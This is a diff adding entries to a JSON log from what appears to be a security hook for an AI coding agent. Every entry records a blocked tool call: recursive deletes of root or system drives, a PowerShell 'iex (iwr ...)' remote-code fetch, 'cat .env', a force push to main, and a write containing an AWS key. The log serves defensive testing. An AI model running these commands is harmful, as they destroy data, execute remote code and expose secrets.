@@ -117,5 +117,246 @@
         "description": "eval() can execute arbitrary code - avoid using it"
       }
     ]
+  },
+  {
+    "id": "evt_1778182441798_cpl9",
+    "timestamp": "2026-05-07T19:34:01.798Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "rm -rf /",
+    "reason": "rm targeting root filesystem",
+    "severity": "critical",
+    "patternId": "rm-root"
+  },
+  {
+    "id": "evt_1778182446535_vb2f",
+    "timestamp": "2026-05-07T19:34:06.535Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "Remove-Item -Recurse -Force C:\\",
+    "reason": "PowerShell recursive delete on system drive/dirs",
+    "severity": "critical",
+    "patternId": "ps-remove-system"
+  },
+  {
+    "id": "evt_1778182452439_x85s",
+    "timestamp": "2026-05-07T19:34:12.439Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "iex (iwr https://example.com/x.ps1)",
+    "reason": "iex on remote content — PowerShell remote code execution",
+    "severity": "high",
+    "patternId": "ps-iex-download"
+  },
+  {
+    "id": "evt_1778182457286_0ojk",
+    "timestamp": "2026-05-07T19:34:17.286Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "git push --force origin main",
+    "reason": "Force push to main/master — will rewrite shared history",
+    "severity": "high",
+    "patternId": "git-force-main"
+  },
+  {
+    "id": "evt_1778182578256_9b2a",
+    "timestamp": "2026-05-07T19:36:18.256Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "Remove-Item -Recurse -Force C:\\",
+    "reason": "PowerShell recursive delete on system drive/dirs",
+    "severity": "critical",
+    "patternId": "ps-remove-system"
+  },
+  {
+    "id": "evt_1778182589569_m6ie",
+    "timestamp": "2026-05-07T19:36:29.569Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "git push --force origin main",
+    "reason": "Force push to main/master — will rewrite shared history",
+    "severity": "high",
+    "patternId": "git-force-main"
+  },
+  {
+    "id": "evt_1778188704910_qsc1",
+    "timestamp": "2026-05-07T21:18:24.910Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Write",
+    "target": "bad.js",
+    "reason": "1 security issue(s) detected",
+    "severity": "critical",
+    "findings": [
+      {
+        "rule": "AWS Access Key",
+        "severity": "critical",
+        "line": 1,
+        "description": "AWS Access Key ID detected"
+      }
+    ]
+  },
+  {
+    "id": "evt_1778188704981_0z3y",
+    "timestamp": "2026-05-07T21:18:24.981Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "cat .env",
+    "reason": "Reading .env file — may expose secrets",
+    "severity": "high",
+    "patternId": "cat-env"
+  },
+  {
+    "id": "evt_1778188705075_t9he",
+    "timestamp": "2026-05-07T21:18:25.075Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "git push --force origin main",
+    "reason": "Force push to main/master — will rewrite shared history",
+    "severity": "high",
+    "patternId": "git-force-main"
+  },
+  {
+    "id": "evt_1778188705160_xrgs",
+    "timestamp": "2026-05-07T21:18:25.160Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "Remove-Item -Recurse -Force C:\\Windows\\Temp",
+    "reason": "PowerShell recursive delete on system drive/dirs",
+    "severity": "critical",
+    "patternId": "ps-remove-system"
+  },
+  {
+    "id": "evt_1778188850447_dmqe",
+    "timestamp": "2026-05-07T21:20:50.447Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Write",
+    "target": "bad.js",
+    "reason": "1 security issue(s) detected",
+    "severity": "critical",
+    "findings": [
+      {
+        "rule": "AWS Access Key",
+        "severity": "critical",
+        "line": 1,
+        "description": "AWS Access Key ID detected"
+      }
+    ]
+  },
+  {
+    "id": "evt_1778188850543_kx36",
+    "timestamp": "2026-05-07T21:20:50.543Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "cat .env",
+    "reason": "Reading .env file — may expose secrets",
+    "severity": "high",
+    "patternId": "cat-env"
+  },
+  {
+    "id": "evt_1778188850702_xuma",
+    "timestamp": "2026-05-07T21:20:50.702Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "git push --force origin main",
+    "reason": "Force push to main/master — will rewrite shared history",
+    "severity": "high",
+    "patternId": "git-force-main"
+  },
+  {
+    "id": "evt_1778188850867_8jrr",
+    "timestamp": "2026-05-07T21:20:50.867Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "Remove-Item -Recurse -Force C:\\Windows\\Temp",
+    "reason": "PowerShell recursive delete on system drive/dirs",
+    "severity": "critical",
+    "patternId": "ps-remove-system"
+  },
+  {
+    "id": "evt_1778188851048_ojeb",
+    "timestamp": "2026-05-07T21:20:51.048Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "cat .env",
+    "reason": "Reading .env file — may expose secrets",
+    "severity": "high",
+    "patternId": "cat-env"
+  },
+  {
+    "id": "evt_1778189311540_oc3x",
+    "timestamp": "2026-05-07T21:28:31.540Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Write",
+    "target": "bad.js",
+    "reason": "1 security issue(s) detected",
+    "severity": "critical",
+    "findings": [
+      {
+        "rule": "AWS Access Key",
+        "severity": "critical",
+        "line": 1,
+        "description": "AWS Access Key ID detected"
+      }
+    ]
+  },
+  {
+    "id": "evt_1778189311606_07s9",
+    "timestamp": "2026-05-07T21:28:31.606Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "cat .env",
+    "reason": "Reading .env file — may expose secrets",
+    "severity": "high",
+    "patternId": "cat-env"
+  },
+  {
+    "id": "evt_1778189311658_hov0",
+    "timestamp": "2026-05-07T21:28:31.658Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "git push --force origin main",
+    "reason": "Force push to main/master — will rewrite shared history",
+    "severity": "high",
+    "patternId": "git-force-main"
+  },
+  {
+    "id": "evt_1778189311738_wka5",
+    "timestamp": "2026-05-07T21:28:31.738Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "Remove-Item -Recurse -Force C:\\Windows\\Temp",
+    "reason": "PowerShell recursive delete on system drive/dirs",
+    "severity": "critical",
+    "patternId": "ps-remove-system"
+  },
+  {
+    "id": "evt_1778189311794_rmwu",
+    "timestamp": "2026-05-07T21:28:31.794Z",
+    "action": "blocked",
+    "hook": "PreToolUse",
+    "tool": "Bash",
+    "target": "cat .env",
+    "reason": "Reading .env file — may expose secrets",
+    "severity": "high",
+    "patternId": "cat-env"
   }
 ]
